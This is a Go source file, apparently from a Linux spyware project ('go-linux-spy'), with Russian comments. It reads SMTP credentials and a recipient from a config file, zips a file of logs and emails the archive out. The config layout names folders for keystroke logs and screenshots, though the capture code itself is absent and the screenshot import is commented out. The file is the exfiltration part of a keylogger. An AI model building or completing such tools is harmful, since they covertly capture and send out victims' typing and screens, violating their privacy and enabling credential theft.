package main

import (
	"fmt"
	// "image/png"
	// "io/ioutil"
	// "log"
	"io"
	"os"
	"time"
	"bufio"
	"strings"
	"strconv"
	"archive/zip"
	"path/filepath"
	// screenshot "github.com/vova616/screenshot"
	gomail "gopkg.in/gomail.v2"
)

var settings string
var email string
var pass string
var port_int int
var port_int1 int
var sbj string
var body string
var fld_key string
var fld_scr string
var email_relay int
var is_scr bool
var time_now string
var time_now_int int
var time_zip string
var date_now_key_fld string
var time_now_key_name string
var date_now_scr_fld string
var time_now_scr_name string
var attach string

func zipit(source, target string) error { 	// Архиватор логов
	zipfile, err := os.Create(target)
	if err != nil {
		return err
	}
	defer zipfile.Close()

	archive := zip.NewWriter(zipfile)
	defer archive.Close()

	info, err := os.Stat(source)
	if err != nil {
		return nil
	}

	var baseDir string
	if info.IsDir() {
		baseDir = filepath.Base(source)
	}

	filepath.Walk(source, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		header, err := zip.FileInfoHeader(info)
		if err != nil {
			return err
		}

		if baseDir != "" {
			header.Name = filepath.Join(baseDir, strings.TrimPrefix(path, source))
		}

		if info.IsDir() {
			header.Name += "/"
		} else {
			header.Method = zip.Deflate
		}

		writer, err := archive.CreateHeader(header)
		if err != nil {
			return err
		}

		if info.IsDir() {
			return nil
		}

		file, err := os.Open(path)
		if err != nil {
			return err
		}
		defer file.Close()
		_, err = io.Copy(writer, file)
		return err
	})

	return err
}
func main() {

file, _ := os.Open("config") 				//имя файла, откуда читаем настройки
f := bufio.NewReader(file)

fmt.Println("\nВаши настройки:")
settings, _ := f.ReadString(0)
fmt.Print(settings)
arr := strings.Split(settings, "\n")		// Массив с настройками,типа [set:val]...
fmt.Print("\n")

email := strings.Split(arr[0], ":") 		// Email login
pass := strings.Split(arr[1], ":")			// Email password
	
server := strings.Split(arr[2], ":")		// SMTP-сервер
port_str := strings.Split(arr[3], ":")		// SMTP-порт
port := port_str[1]							// SMTP-порт - адский конверт в int
port_int, _ := strconv.ParseInt(port, 10, 0)	// SMTP-порт - адский конверт в int
port_int1 = int(port_int)					// !SMTP-порт - адский конверт в int
	
to := strings.Split(arr[4], ":")			// E-mail получателя
sbj := strings.Split(arr[5], ":")			// Тема письма
body := strings.Split(arr[6], ":")			// Тело письма
	
fld_key := strings.Split(arr[7], ":")		// Папка хранения текстовых логов
fld_scr := strings.Split(arr[8], ":")		// Папка хранения скриншотов
/*	
email_relay := strings.Split(arr[9], ":")	// Задержка отправки почты в секундах, по умолчанию 14400
email_relay_int1 := email_relay[1]			// Задержка отправки почты в секундах - адский конверт в int
email_relay_int2, _ := strconv.ParseInt(email_relay_int1, 10, 0) // Задержка отправки почты в секундах - адский конверт в int
email_relay_int = int(email_relay_int2)		// !Задержка отправки почты в секундах - адский конверт в int
*/

// is_scr := strings.Split(arr[10], ":")		// Делать ли скриншоты - если trur - да, false - нет
//fmt.Println("\n", is_scr[1])
// is_scr_bool := strconv.ParseBool(is_scr[1]); err == nil {
// 		fmt.Println("ошибка\n")
// 	}
defer file.Close()

zipit("/home/f1/Документы/go/spy/go-linux-spy-master/config", "/home/f1/Документы/go/spy/go-linux-spy-master/config.zip") 	// Архивируем лог
	
time_now := time.Now()
fmt.Printf("%s\n\n", time_now)
fmt.Printf("Email логин - %s\n", email[1])
fmt.Printf("SMTP-сервер - %s\n", server[1])
fmt.Printf("SMTP-порт - %s\n", port_str[1])
fmt.Printf("E-mail получателя - %s\n", to[1])
fmt.Printf("Папка для хранения нажатия клавиш - %s\n", fld_key[1])
fmt.Printf("Скриншоты включены\n") //написать проверку
fmt.Printf("Папка для хранения скриншотов - %s\n\n", fld_scr[1])
	// if is_scr_bool == true {
	// 		fmt.Printf("включены")
	// 		fmt.Printf("Папка для хранения скриншотов - %s\n\n", fld_scr[1])
	// 	}
//письмо

m := gomail.NewMessage()
m.SetHeader("From", email[1])
m.SetHeader("To", to[1], email[1]) //!!!!!!!!!!!!!!
m.SetAddressHeader("", "", "")
m.SetHeader("Subject", sbj[1])
m.SetBody("text/html", body[1])
m.Attach("config.zip")

//отправка

d := gomail.NewDialer(server[1], port_int1, email[1], pass[1])
if err := d.DialAndSend(m); err != nil {
panic(err)
}

}
